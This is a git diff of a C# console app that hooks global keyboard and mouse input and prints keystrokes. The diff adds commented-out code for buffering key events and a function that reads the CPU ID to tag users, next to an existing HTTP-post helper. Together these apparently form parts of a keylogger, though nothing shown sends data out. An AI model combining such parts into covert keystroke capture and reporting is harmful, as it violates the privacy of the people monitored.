@@ -8,14 +8,17 @@ using System.Threading.Tasks;
 using ActionHook;
 using System.Threading;
 using System.Windows.Forms;
+using System.Management;
 
 namespace ActionHook.ConsoleApp
 {
     public class ConsoleApp
     {
+
         static void Main(string[] args)
         {
             var eventHookFactory = new EventHookFactory();
+            //Queue<string> events = new Queue<string>();
 
             // 用工厂方法获得watcher对象
             var keyboardWatcher = eventHookFactory.GetKeyboardWatcher();
@@ -25,6 +28,10 @@ namespace ActionHook.ConsoleApp
             keyboardWatcher.OnKeyInput += (s, e) =>
             {
                 Console.WriteLine("Key {0} event of key {1}", e.KeyData.EventType, e.KeyData.Keyname);
+                //string out1 = "";
+                //events += string.Format("Key {0} event of key {1}", e.KeyData.EventType, e.KeyData.Keyname);
+
+                //Console.WriteLine(ss);
             };
 
             var mouseWatcher = eventHookFactory.GetMouseWatcher();
@@ -59,7 +66,7 @@ namespace ActionHook.ConsoleApp
             eventHookFactory.Dispose();
         }
 
-
+        #region HTTP-post
         // 示例HTTP-post请求
         // ref: https://www.imooc.com/article/40178
         public static string Post(string url, Dictionary<string, string> dic)
@@ -96,6 +103,33 @@ namespace ActionHook.ConsoleApp
             // Console.WriteLine(result); // print
             return result;
         }
+        #endregion
+
+        #region Get_CPUID
+        // 获取CPUID，用以标志鶸
+        // ref: https://blog.csdn.net/iilegend/article/details/75087638
+        public static string Get_CPUID()
+        {
+            try
+            {
+                //需要在解决方案中引用System.Management.DLL文件  
+                ManagementClass mc = new ManagementClass("Win32_Processor");
+                ManagementObjectCollection moc = mc.GetInstances();
+                string strCpuID = null;
+                foreach (ManagementObject mo in moc)
+                {
+                    strCpuID = mo.Properties["ProcessorId"].Value.ToString();
+                    mo.Dispose();
+                    break;
+                }
+                return strCpuID;
+            }
+            catch
+            {
+                return "";
+            }
+        }
+        #endregion
     }
 
 
